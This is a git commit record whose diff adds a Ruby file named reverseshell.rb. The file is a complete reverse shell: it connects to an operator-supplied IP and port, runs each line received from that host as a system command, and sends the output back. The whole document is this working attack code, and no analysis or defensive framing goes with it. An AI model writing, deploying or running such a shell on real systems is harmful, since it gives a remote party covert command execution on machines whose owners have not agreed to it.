1fb9960f702378353cee33f9f8dca9942463a3b3
thekarunakarreddy <76210523+thekarunakarreddy@users.noreply.github.com>
2023-05-26 11:56:47 +0530

    Update reverseshell.rb

--- reverseshell.rb
+++ reverseshell.rb
@@ -1,1 +1,14 @@
+require 'socket'
+
+ip = 'your_ip_address'
+port = your_port_number
+
+socket = TCPSocket.new(ip, port)
+
+while line = socket.gets
+  output = `#{line}`
+  socket.puts(output)
+end
+
+socket.close
 
